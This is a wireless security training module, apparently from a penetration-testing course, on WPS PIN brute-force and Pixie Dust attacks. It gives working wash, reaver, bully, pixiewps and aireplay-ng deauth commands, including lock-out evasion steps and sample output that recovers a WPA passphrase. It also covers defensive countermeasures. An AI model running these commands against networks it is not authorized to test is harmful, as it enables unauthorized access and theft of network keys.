# Module 11 — WPS Attacks: PIN Bruteforce & Pixie Dust

> **Prerequisites:** [Module 07 — WPA2 Cracking](../module-07-wpa2-cracking/)
> **Next Module:** [Module 12 — PMKID Attack](../module-12-pmkid-attack/)

> **Legal Disclaimer:** WPS attacks must only be performed on networks you own or have **explicit written authorization** to test. Unauthorized access attempts are illegal under the CFAA, UK Computer Misuse Act, and equivalent laws worldwide.

---

## Table of Contents

1. [Wi-Fi Protected Setup (WPS) Overview](#1-wi-fi-protected-setup-wps-overview)
2. [The WPS PIN Design Flaw](#2-the-wps-pin-design-flaw)
3. [WPS Protocol Flow (M1–M8)](#3-wps-protocol-flow-m1m8)
4. [Scanning for WPS-Enabled Targets with wash](#4-scanning-for-wps-enabled-targets-with-wash)
5. [PIN Bruteforce with reaver](#5-pin-bruteforce-with-reaver)
6. [PIN Bruteforce with bully](#6-pin-bruteforce-with-bully)
7. [Pixie Dust Attack](#7-pixie-dust-attack)
8. [Offline PIN Cracking with pixiewps](#8-offline-pin-cracking-with-pixiewps)
9. [WPS Lock-Out and Rate Limiting](#9-wps-lock-out-and-rate-limiting)
10. [Detection & Countermeasures](#10-detection--countermeasures)
11. [Knowledge Check](#11-knowledge-check)

---

## 1. Wi-Fi Protected Setup (WPS) Overview

### What Is WPS?

**Wi-Fi Protected Setup** (WPS) was introduced in 2006 by the Wi-Fi Alliance to simplify connecting devices to WPA2-secured networks without requiring users to type a complex passphrase. It provides three connection methods:

| Method | How It Works | Security |
|--------|-------------|----------|
| **PIN** | 8-digit PIN printed on router label or displayed in UI | Critically flawed |
| **PBC** | Push-button on router and client within 2 minutes | Reasonable (physical access required) |
| **NFC** | Near-field tag tap | Reasonable (proximity required) |

The PIN method is universally supported and almost universally vulnerable.

### Why WPS Still Matters

Despite being known since 2011, WPS remains:
- Enabled by **default** on millions of consumer routers
- Present on ISP-provided equipment in homes and small offices
- The fastest path to a WPA2 network key without capturing a handshake
- Exploitable in under **4 seconds** on vulnerable firmware (Pixie Dust)

---

## 2. The WPS PIN Design Flaw

### The Split-Halves Vulnerability (Viehe/Gallagher 2011)

The 8-digit WPS PIN is actually validated **in two halves** by the access point:

```
WPS PIN:  1  2  3  4  5  6  7  8
          ├──── Half 1 ────┤ ├─ Half 2 ─┤
          1  2  3  4        5  6  7  (+ checksum)
```

**Half 1** (digits 1–4): 10,000 possible values (0000–9999)
**Half 2** (digits 5–7): 1,000 possible values (000–999) — digit 8 is a checksum

The AP validates **half 1 first** (via EAP NACK on failure), then validates half 2 separately. This reduces the search space from:

```
10^8 = 100,000,000 guesses (exhaustive 8-digit)
```
to:
```
10^4 + 10^3 = 11,000 guesses (split validation)
```

### Attack Speed Comparison

| Attack | Max Guesses | Typical Time |
|--------|-------------|-------------|
| Full 8-digit brute force | 100,000,000 | ~3 years |
| Split-half WPS PIN | 11,000 | ~4–10 hours |
| Pixie Dust (weak nonce) | 1 (offline) | < 10 seconds |

---

## 3. WPS Protocol Flow (M1–M8)

Understanding the exchange helps explain both the split-half and Pixie Dust vulnerabilities.

```
Enrollee (Client)                     Registrar (AP)
      │                                     │
      │──── EAP-Response/Identity ─────────►│
      │◄─── EAP-Request/WPS Start ─────────│
      │                                     │
      │──── M1 (enrollee nonce E-Nonce,     │
      │         PKE public key) ───────────►│
      │                                     │
      │◄─── M2 (registrar nonce R-Nonce,    │
      │         PKR public key) ────────────│
      │                                     │
      │──── M3 (E-Hash1 = HMAC of PIN       │
      │         half 1 + nonces) ──────────►│
      │◄─── M4 (R-Hash1 validated) ─────────│  ← Half 1 validated here
      │                                     │
      │──── M5 (E-Hash2 = HMAC of PIN       │
      │         half 2 + nonces) ──────────►│
      │◄─── M6 (R-Hash2 validated) ─────────│  ← Half 2 validated here
      │                                     │
      │──── M7 ────────────────────────────►│
      │◄─── M8 (encrypted WPA2 PSK) ────────│  ← AP sends real passphrase!
```

### Key Points

- **M4 NACK** = Half 1 wrong → attacker knows to try next 4-digit value
- **M6 NACK** = Half 2 wrong → attacker knows half 1 is correct, brute forces half 2
- **M8** contains the actual WPA2 passphrase, encrypted with session keys derived from the PIN
- Once the full PIN is found, the AP **sends you the plaintext WPA2 key**

### The Pixie Dust Angle

In M1 and M2, the enrollee and registrar exchange **nonces** (E-Nonce and R-Nonce). The E-Hash values in M3/M5 are computed as:

```
E-Hash1 = HMAC-SHA-256(AuthKey, E-S1 || PSK1 || PKE || PKR)
E-Hash2 = HMAC-SHA-256(AuthKey, E-S2 || PSK2 || PKE || PKR)
```

Where `E-S1` and `E-S2` are **secret nonces** chosen by the enrollee. If the enrollee uses a **weak random number generator** (common on cheap routers), these nonces can be **derived offline** — eliminating the need to interact with the AP at all for verification.

---

## 4. Scanning for WPS-Enabled Targets with wash

`wash` is included with the `reaver` package and scans for WPS-enabled APs.

### Installation

```bash
sudo apt install reaver
# wash is included in the reaver package
```

### Basic Scan

```bash
# Put interface in monitor mode first
sudo airmon-ng start wlan0

# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Output columns:
# BSSID | Ch | dBm | WPS | Lck | Vendor | ESSID
```

### wash Output Explained

```
BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
─────────────────────────────────────────────────────
AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Netgear   HomeNetwork
11:22:33:44:55:66  11  -67  1.0  Yes  TP-Link   OfficeWiFi
22:33:44:55:66:77   1  -72  2.0  No   D-Link    CafeGuest
```

| Column | Meaning |
|--------|---------|
| `WPS` | WPS version (1.0 or 2.0) |
| `Lck` | WPS locked (Yes = AP blocked further attempts) |
| `Vendor` | Router manufacturer (useful for Pixie Dust targeting) |

### Targeted Channel Scan

```bash
# Lock to a specific channel for faster results
sudo wash -i wlan0mon -c 6

# Save scan results
sudo wash -i wlan0mon -o wps_targets.csv

# Verbose — shows WPS device info (model, serial)
sudo wash -i wlan0mon -v
```

---

## 5. PIN Bruteforce with reaver

`reaver` is the canonical WPS PIN bruteforce tool. It implements the split-half attack automatically.

### Basic Attack

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# -i   Monitor mode interface
# -b   Target BSSID
# -vv  Verbose (show each PIN attempt)
```

### Important reaver Flags

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -c 6          \   # Lock to channel 6
  -d 1          \   # Delay 1 second between attempts (avoids lockout)
  -t 5          \   # Timeout per attempt (seconds)
  -r 3:15       \   # After 3 attempts, sleep 15 seconds (evade rate-limit)
  -N            \   # Don't send NACK on M5/M7 failures (some APs need this)
  -S            \   # Use small DH keys (faster, some APs require it)
  -vv               # Verbose output
```

### reaver Output

```
[*] Waiting for beacon from AA:BB:CC:DD:EE:FF
[*] Switching wlan0mon to channel 6
[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: HomeNetwork)
[+] Trying pin "12345670"
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
...
[+] Trying pin "12340005"
[+] WPS PIN: '12345678'
[+] WPA PSK: 'MySecretPassword123'
[+] AP SSID: 'HomeNetwork'
```

### Resuming a Session

`reaver` saves progress automatically in `/etc/reaver/`:

```bash
# Resume interrupted session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
# Automatically detects and resumes saved session

# Start fresh (ignore saved state)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --no-nacks -f
```

---

## 6. PIN Bruteforce with bully

`bully` is an alternative WPS bruteforce tool, often more reliable against APs where `reaver` struggles.

### Installation

```bash
sudo apt install bully
```

### Basic Attack

```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3

# -b   Target BSSID
# -v 3 Verbosity level (1–3)
```

### Key bully Flags

```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF \
  -c 6      \   # Channel
  -d        \   # Use small Diffie-Hellman keys
  -T 0.5    \   # Timeout (seconds)
  -1        \   # Start with PIN 00000000 (sequential)
  -S        \   # Fixed source MAC
  -v 3          # Max verbosity
```

### bully vs reaver

| Feature | reaver | bully |
|---------|--------|-------|
| Session resumption | Auto | Manual via `-p` |
| Small DH keys | `-S` flag | `-d` flag |
| Rate-limit evasion | `-r N:S` | `-d` (delay) |
| Reliability | Good | Often better on stubborn APs |
| Pixie Dust support | Via `-K` | Via `-d -L` |

---

## 7. Pixie Dust Attack

### What Makes Pixie Dust Different

The Pixie Dust attack, discovered by **Dominique Bongard** in 2014, is an **offline** attack. Instead of sending thousands of PIN guesses to the AP, it:

1. Captures a **single WPS exchange** (M1–M3)
2. Analyses the enrollee's nonces (`E-S1`, `E-S2`) which are revealed during the exchange
3. If the AP used a **weak or predictable PRNG** for nonce generation, derives the correct PIN **offline** in seconds

### Vulnerable Firmware

Pixie Dust exploits weak random number generation in the AP's WPS implementation. Affected vendors include (non-exhaustive):

| Vendor | Vulnerability |
|--------|--------------|
| Ralink (MediaTek) | E-S1 = E-S2 = 0x00...00 |
| Broadcom | E-S1 derived from timestamp |
| Realtek | Predictable seeding |
| Various cheap OEM | Reuses nonces across sessions |

### Running Pixie Dust with reaver

```bash
# -K enables Pixie Dust mode in reaver
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

# -K 1  Run Pixie Dust attack using pixiewps internally
```

### Running Pixie Dust with bully

```bash
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
# bully automatically attempts Pixie Dust when -d (small DH) is used
```

---

## 8. Offline PIN Cracking with pixiewps

`pixiewps` is the standalone offline cracker used when you have captured the WPS exchange manually.

### Installation

```bash
sudo apt install pixiewps
# Or from source:
git clone https://github.com/wiire-a/pixiewps.git
cd pixiewps && make && sudo make install
```

### Capturing WPS Parameters Manually

Use `reaver` or `bully` in verbose mode to extract the required values from the M1–M3 exchange:

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -S 2>&1 | tee wps_capture.txt

# Values to extract from output:
# PKE   = enrollee public key
# PKR   = registrar public key
# E-Hash1, E-Hash2
# E-Nonce, R-Nonce
# AuthKey
```

### Running pixiewps

```bash
sudo pixiewps \
  -e <PKE>      \   # Enrollee public key
  -r <PKR>      \   # Registrar public key
  -s <E-Hash1>  \   # Enrollee Hash 1
  -z <E-Hash2>  \   # Enrollee Hash 2
  -a <AuthKey>  \   # Authentication key
  -n <E-Nonce>      # Enrollee nonce

# Successful output:
# [*] Running pixiewps 1.4
# [+] WPS pin found: 12345678
# [*] Time taken: 0 s 123 ms
```

### Full Automated Pixie Dust (reaver + pixiewps)

```bash
# reaver with -K handles the capture and pixiewps invocation automatically
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1 -f

# If pin found:
# [Pixie-Dust] WPS pin found: 12345678
# [+] WPA PSK: 'MyNetworkPassword!'
```

---

## 9. WPS Lock-Out and Rate Limiting

### AP Self-Defense

Many modern APs implement **WPS lock-out** after a configurable number of failed PIN attempts:

```
wash output when locked:
AA:BB:CC:DD:EE:FF  6  -45  2.0  Yes  Netgear  HomeNetwork
                                  ^^^
                              Lck = Yes → WPS locked
```

### Strategies to Evade Lock-Out

```bash
# 1. Slow the attack rate (reaver)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -r 3:60
# -d 5    5-second delay between attempts
# -r 3:60 After 3 attempts, sleep 60 seconds

# 2. Wait for lock-out to expire (typically 60 seconds to 5 minutes)
# Some APs reset the counter after a reboot or power cycle

# 3. Deauth the AP's clients (sometimes resets the WPS counter)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 4. Use Pixie Dust — only needs 1 exchange, never triggers lock-out
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1
```

### WPS 2.0 and Enhanced Lock-Out

WPS 2.0 introduced a mandatory **station lock-down** feature:
- After a configurable number of failures, the AP locks WPS for a time period
- Some implementations lock permanently until a physical button press
- `wash` shows `Lck: Yes` for locked APs

---

## 10. Detection & Countermeasures

### For Network Defenders

| Countermeasure | How to Apply |
|---------------|-------------|
| **Disable WPS** | Router admin → Wireless → WPS → Disable (most effective) |
| **WPS lock-out** | Enable in router firmware, set low threshold (3–5 attempts) |
| **Firmware updates** | Update router firmware to patch weak PRNG (Pixie Dust) |
| **WPS 2.0 only** | Reject WPS 1.0 enrollees if supported |
| **Monitor for wash scans** | Detect repeated WPS probe IE frames in WIDS |

### Verify WPS Is Actually Disabled

Some routers report WPS as disabled but still respond to WPS exchanges:

```bash
# Verify WPS disabled by checking beacon frame
sudo airodump-ng wlan0mon
# Or scan with wash after disabling:
sudo wash -i wlan0mon
# Target should no longer appear in wash output
```

### Detecting WPS Attacks in Progress

```bash
# Wireshark filter for WPS probe requests
wlan.tag.number == 221 && wlan_mgt.tag.oui == 00:50:f2

# Capture and inspect WPS information elements
sudo tshark -i wlan0mon -Y "wps" -T fields \
  -e wlan.sa -e wps.wifi_protected_setup_state
```

---

## 11. Knowledge Check

Before proceeding to Module 12, you should be able to answer:

1. What is WPS and what three enrollment methods does it define? Which one is critically flawed?
2. Explain the WPS PIN split-half vulnerability — why does it reduce the search space from 100 million to 11,000?
3. In the WPS M1–M8 exchange, at which message does the AP validate the first PIN half, and what response indicates failure?
4. What does `wash -i wlan0mon` do and what does the `Lck` column indicate?
5. Write the `reaver` command to attack BSSID `AA:BB:CC:DD:EE:FF` on channel 6 with a 2-second delay between attempts and verbose output.
6. What is the Pixie Dust attack and how does it differ fundamentally from a standard PIN bruteforce?
7. What type of cryptographic weakness in router firmware makes Pixie Dust possible? Name two vendor families known to be vulnerable.
8. What `reaver` flag enables Pixie Dust mode, and approximately how long does a successful Pixie Dust attack take?
9. What is WPS lock-out, and name two techniques an attacker uses to evade it?
10. What is the single most effective countermeasure against all WPS attacks, and how do you verify it is actually applied?

---

**Next:** [Module 12 — PMKID Attack](../module-12-pmkid-attack/)
